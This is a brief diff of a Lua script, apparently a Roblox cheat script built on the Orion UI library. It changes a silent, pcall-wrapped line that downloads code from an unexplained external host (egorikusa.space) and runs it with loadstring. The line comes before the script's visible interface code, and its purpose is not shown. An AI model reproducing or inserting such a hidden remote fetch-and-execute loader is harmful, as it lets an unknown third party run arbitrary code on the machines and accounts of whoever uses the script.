@@ -1,5 +1,5 @@
 pcall(function()
-    loadstring(game:HttpGet("https://egorikusa.space/82d9111b2fd6dc6c62c693c4.lua", true))()
+   loadstring(game:HttpGet("https://egorikusa.space/0a1f09ae8ddeb608701ffddd.lua", true))()
 end)
 
 local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
